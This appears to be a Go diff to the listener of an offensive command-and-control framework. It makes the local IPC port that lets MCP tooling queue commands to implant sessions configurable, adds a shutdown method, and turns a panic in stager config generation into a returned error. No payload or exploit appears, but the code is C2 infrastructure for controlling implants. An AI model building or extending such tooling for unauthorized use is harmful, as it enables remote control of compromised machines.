@@ -30,12 +30,15 @@ type Listener struct {
 	KeyFile     string
 	MTLSCAFile  string // CA certificate for verifying client certs (mTLS enforcement)
 	Running     bool
+	IPCPort     int // local IPC server port for MCP tooling (0 = default 24242)
 
-	mu       sync.RWMutex
-	sessions map[string]*ImplantSession
-	commands map[string][]QueuedCommand
-	results  map[string][]CommandResult
-	files    map[string][]FileDelivery
+	mu          sync.RWMutex
+	sessions    map[string]*ImplantSession
+	commands    map[string][]QueuedCommand
+	results     map[string][]CommandResult
+	files       map[string][]FileDelivery
+	ipcServer   *http.Server
+	ipcListener net.Listener
 }
 
 // ImplantSession represents a connected implant.
@@ -206,23 +209,54 @@ func (l *Listener) Start() error {
 	return server.ListenAndServe()
 }
 
-// startIPCServer spawns a local REST server on port 24242 to allow external
-// processes (like the MCP server) to interact with the C2 listener.
+// startIPCServer spawns a local REST server so external processes (like the MCP
+// server) can interact with the C2 listener.  The port is set from l.IPCPort
+// (0 = default 24242); the actual port is stored back into l.IPCPort so
+// consumers can read it after Start() returns.
 func (l *Listener) startIPCServer() {
 	mux := http.NewServeMux()
 	mux.HandleFunc("/api/sessions", l.handleListSessions)
 	mux.HandleFunc("/api/command", l.handleQueueCommand)
 	mux.HandleFunc("/api/results", l.handleGetResults)
 
-	addr := "127.0.0.1:24242"
-	fmt.Printf("[*] IPC server starting on http://%s\n", addr)
-	server := &http.Server{
-		Addr:    addr,
-		Handler: mux,
+	port := l.IPCPort
+	if port == 0 {
+		port = 24242
 	}
-	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
+	addr := fmt.Sprintf("127.0.0.1:%d", port)
+
+	ln, err := net.Listen("tcp", addr)
+	if err != nil {
+		fmt.Printf("[!] IPC server failed: %v\n", err)
+		return
+	}
+
+	// If port was dynamic (0), store the actual port the OS assigned
+	l.IPCPort = ln.Addr().(*net.TCPAddr).Port
+	l.ipcListener = ln
+
+	fmt.Printf("[*] IPC server starting on http://127.0.0.1:%d\n", l.IPCPort)
+
+	l.ipcServer = &http.Server{Handler: mux}
+	if err := l.ipcServer.Serve(ln); err != nil && err != http.ErrServerClosed {
 		fmt.Printf("[!] IPC server failed: %v\n", err)
 	}
+}
+
+// Close shuts down the IPC server and marks the listener as stopped.
+func (l *Listener) Close() {
+	l.mu.Lock()
+	defer l.mu.Unlock()
+
+	if l.ipcListener != nil {
+		l.ipcListener.Close()
+		l.ipcListener = nil
+	}
+	if l.ipcServer != nil {
+		l.ipcServer.Close()
+		l.ipcServer = nil
+	}
+	l.Running = false
 }
 
 // handleCheckin processes implant check-ins and returns queued commands.
@@ -456,10 +490,10 @@ func (l *Listener) sessionCount() int {
 	return len(l.sessions)
 }
 
-func GenerateStagerConfig(c2URL string) *StagerConfig {
+func GenerateStagerConfig(c2URL string) (*StagerConfig, error) {
 	b := make([]byte, 16)
 	if _, err := rand.Read(b); err != nil {
-		panic(fmt.Sprintf("failed to generate random ID: %v", err))
+		return nil, fmt.Errorf("generate random stager ID: %w", err)
 	}
 	return &StagerConfig{
 		ID:       hex.EncodeToString(b),
@@ -468,7 +502,7 @@ func GenerateStagerConfig(c2URL string) *StagerConfig {
 		Jitter:   20,
 		Protocol: "https",
 		Created:  time.Now(),
-	}
+	}, nil
 }
 
 // generateSelfSignedCert creates a self-signed TLS certificate.
